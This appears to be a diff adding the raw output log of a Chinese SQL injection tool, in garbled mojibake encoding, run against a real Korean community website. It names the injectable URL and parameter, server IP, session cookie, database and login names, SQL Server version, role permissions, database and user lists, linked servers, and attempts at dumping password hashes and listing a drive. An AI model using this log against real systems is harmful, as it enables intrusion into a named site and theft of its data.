@@ -1,0 +1,105 @@
+¡öÂ©¶´ĞÅÏ¢:============================================================
+ ¡¤URL:http://www.heykorean.com/HK_HBoard/layout.asp?board_no=1&seq=120712
+ ¡¤Ò³Ãæ±êÌâ£º
+	ìºë‚˜ë‹¤ ëª¬íŠ¸ë¦¬ì˜¬ ë²„ìŠ¤ ì—¬í–‰ i-20 ì•ˆê°€ì ¸ì˜´ - ë©˜í† ë§ :: HeyKorean.com
+
+ ¡¤²ÎÊı:board_no=1&seq=120712
+ ¡¤·½·¨:GET
+ ¡¤ÀàĞÍ:Numeric
+ ¡¤ÀûÓÃ·½·¨:And
+ ¡¤½Å±¾ÓïÑÔ:asp
+ ¡¤IP:76.12.31.20
+ ¡¤Êı¾İ¿â:SQL Server
+ ¡¤HEAD:
+HTTP/1.1 302 Object moved
+Connection: close
+Date: Sun, 03 Apr 2011 15:04:53 GMT
+Server: WWW Server/1.1
+Cache-Control: max-age: 315360000
+X-Powered-By: ASP.NET
+pragma: no-cache
+Cache-Control: private
+Location: http://mentor.heykorean.com/01_QA/View.aspx?fSeq=120712&fCatSeq=0101
+Content-Length: 193
+Content-Type: text/html; Charset=euc-kr
+Expires: Sat, 02 Apr 2011 15:04:52 GMT
+Set-Cookie: wZipcode=10010; domain=.heykorean.com; path=/
+Set-Cookie: cookieLocationCode=0; domain=.heykorean.com; path=/
+Set-Cookie: cookieLanguage=ko; domain=.heykorean.com; path=/
+Set-Cookie: user=; domain=heykorean.com; path=/
+Set-Cookie: ASPSESSIONIDSSTBCQRT=FDLHEHJDKILIEABPIAACCAAM; path=/
+Cache-control: no-cache, no-store
+
+
+
+¡öÊı¾İ¿âĞÅÏ¢:============================================================
+- Êı¾İ¿âÃû£ºheykorean_Board
+- ÓÃ»§Ãû£ºheydeveloper_web
+- °æ±¾£ºMicrosoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- ·şÎñÆ÷Ãû£ºBETA
+- ·şÎñÃû£ºMSSQLSERVER
+- ÏµÍ³ÓÃ»§Ãû£ºheydeveloper_web
+
+¡ö·¢ÏÖSQL2005£¬½¨ÒéÄúÏÈÇĞ»»µ½ 'ÔÓÏî¹¤¾ß' ±êÇ©Ò³Ãæ¿ªÆôÏà¹ØÉèÖÃ¡£
+ ¡¤µ±Ç°ÓÃ»§È¨ÏŞ£º
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ¡¤Êı¾İ¿âĞÅÏ¢:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master		
+tempdb		
+model		
+msdb		
+ReportServer		
+ReportServerTempDB		
+heykorean_Board		
+kocham		
+
+ ¡¤SQL ServerÓÃ»§ÃûÁĞ±í£º
+ÓÃ»§Ãû		½ÇÉ«		°²È«±àºÅ
+----------------------------------------------------------------------------------------------------
+public		?..?.???????û	Apr  8 2003  9:10AM	
+dbo			Apr  8 2003  9:10AM	
+guest		.	Apr  8 2003  9:10AM	
+db_owner		?..?.......?.	Apr  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	Apr  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	Apr  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	Apr  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	Apr  8 2003  9:10AM	
+db_datareader		?..?.......?.	Apr  8 2003  9:10AM	
+db_datawriter		?..?.......?.	Apr  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	Apr  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	Apr  8 2003  9:10AM	
+
+ ¡¤Êı¾İ¿âÏà¹Ø½ø³ÌĞÅÏ¢:
+³ÌĞòÃû	×´Ì¬	Ö÷»úÃû	Ö÷»ú½ø³ÌID	ÃüÁîĞĞ	NTÓÃ»§Ãû
+----------------------------------------------------------------------------------------------------
+È¡¼ÇÂ¼ÊıÊ§°Ü£¬Ê¹ÓÃÉè¶¨Öµ£º5
+Internet Information Services	runnable	375J2D1	6604	SELECT		
+
+ ¡¤Á´½ÓµÄ·şÎñÆ÷ĞÅÏ¢:
+·şÎñÆ÷Ãû	·şÎñÆ÷²úÆ·	Ìá¹©ÕßÃû	Êı¾İÔ´	Î»ÖÃ	·şÎñÆ÷ÍøÂçÃû
+----------------------------------------------------------------------------------------------------
+BETA	SQL Server	SQLOLEDB	BETA		BETA	
+MAIN	heykorean	SQLOLEDB	db.heykorean.com			
+
+ ¡¤Êı¾İ¿âÓÃ»§µÇÂ¼ĞÅÏ¢£º
+ÓÃ»§Ãû	ÃÜÂëHASH	Êı¾İ¿â±àºÅ	ÓïÑÔ	Ê±¼ä1	Ê±¼ä2
+----------------------------------------------------------------------------------------------------
+È¡¼ÇÂ¼ÊıÊ§°Ü£¬Ê¹ÓÃÉè¶¨Öµ£º5
+
+Dir of D:: 
+Ò»´ÎĞÔ»ñÈ¡Ê§°Ü£¬ÕıÔÚÅú´Î»ñÈ¡¡­¡­
